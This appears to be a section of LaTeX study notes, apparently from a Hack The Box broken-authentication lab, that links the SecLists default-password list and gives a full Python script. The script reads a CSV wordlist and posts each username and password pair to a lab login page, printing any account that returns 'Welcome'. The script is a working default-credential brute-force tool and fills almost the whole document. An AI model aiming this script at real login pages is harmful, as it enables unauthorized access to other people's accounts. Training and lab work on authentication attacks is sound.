
\section{Default credentials}

\href{https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv}{SecLists default passwords}

\begin{verbatim}
import sys
import requests
import os.path

url = "http://brokenauthentication.hackthebox.eu/login.php"
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}
valid = "Welcome"

def unpack(fline):
    userid = fline.split(",")[1]
    passwd = fline.split(",")[2]
    return userid, passwd

def do_req(url, userid, passwd, headers):
    data = {"userid": userid, "passwd": passwd, "submit": "submit"}
    res = requests.post(url, headers=headers, data=data)
    return res.text

def check(haystack, needle):
    if needle in haystack:
        return True
    else:
        return False

def main():
    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
        fname = sys.argv[1]
    else:
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    with open(fname) as fh:
        # read file line by line
        for fline in fh:
            if fline.startswith("#"):
                continue
            userid, passwd = unpack(fline.rstrip())
            print("[-] Checking account {} {}".format(userid, passwd))
            res = do_req(url, userid, passwd, headers)
            if (check(res, valid)):
                print("[+] Valid account found: userid:{} passwd:{}".format(userid, passwd))

if __name__ == "__main__":
    main()
\end{verbatim}